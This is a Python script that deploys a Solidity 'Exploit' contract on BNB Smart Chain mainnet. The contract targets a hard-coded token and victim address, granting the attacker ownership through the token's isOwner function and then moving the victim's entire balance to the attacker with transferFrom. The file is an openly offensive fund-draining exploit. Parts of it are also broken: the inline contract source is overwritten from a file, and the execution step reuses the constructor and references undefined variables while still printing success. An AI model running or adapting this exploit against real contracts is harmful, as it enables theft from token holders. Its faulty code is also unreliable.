from web3 import Web3
from solcx import compile_source
import sys

attacker_private_key = sys.argv[1]

# Connect to BSC node (or testnet fork)
w3 = Web3(Web3.HTTPProvider("https://bsc-dataseed.binance.org"))
attacker_account = w3.eth.account.from_key(attacker_private_key)
attacker_address = attacker_account.address

# Victim and token address
victim = "0xDA5eEeF71CE9892b79b0215E771153f84930A653"
token = "0xc461CE1893895ea6eA3dacFe03dbd14120BFf8ba"

# Malicious contract source
malicious_source = '''
pragma solidity ^0.8.0;

interface IToken {
    function isOwner(address a) external;
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Exploit {
    IToken public token;
    address public victim;
    address public attacker;

    constructor(address _token, address _victim, address _attacker) {
        token = IToken(_token);
        victim = _victim;
        attacker = _attacker;
    }

    function execute() external {
        token.isOwner(attacker);
        uint256 amount = token.balanceOf(victim);
        token.transferFrom(victim, attacker, amount);
    }
}
'''

# Compile contract
with open("C.sol", "r") as file:
    malicious_source = file.read()

compiled_sol = compile_source(malicious_source)
contract_id, contract_interface = compiled_sol.popitem()

# Deploy malicious contract
Exploit = w3.eth.contract(abi=contract_interface["abi"], bytecode=bytes.fromhex(contract_interface["bin"]))
construct_txn = Exploit.constructor(token, victim, attacker_address).build_transaction({
    'from': attacker_address,
    'nonce': w3.eth.get_transaction_count(attacker_address),
    'gas': 3000000,
    'gasPrice': w3.toWei('5', 'gwei')
})

signed_txn = w3.eth.account.sign_transaction(construct_txn, private_key=attacker_private_key)
tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

print(f"[+] Exploit contract deployed at: {tx_receipt.contractAddress}")

# Execute exploit
exploit_contract = w3.eth.contract(address=tx_receipt.contractAddress, abi=contract_interface['abi'])
construct_txn = Exploit.constructor(token, victim, attacker_address).build_transaction({
    "chainId": 56,
    "from": attacker_address,
    "nonce": nonce,
    # don't manually set gas or gasPrice yet
})
# Estimate gas after building
gas_estimate = w3.eth.estimate_gas(construct_txn)
gas_price = w3.eth.gas_price

# Add the estimates
construct_txn["gas"] = gas_estimate
construct_txn["gasPrice"] = gas_price


signed_exec_txn = w3.eth.account.sign_transaction(exec_txn, private_key=attacker_private_key)
exec_tx_hash = w3.eth.send_raw_transaction(signed_exec_txn.rawTransaction)
exec_receipt = w3.eth.wait_for_transaction_receipt(exec_tx_hash)

print("[+] Exploit executed successfully.")
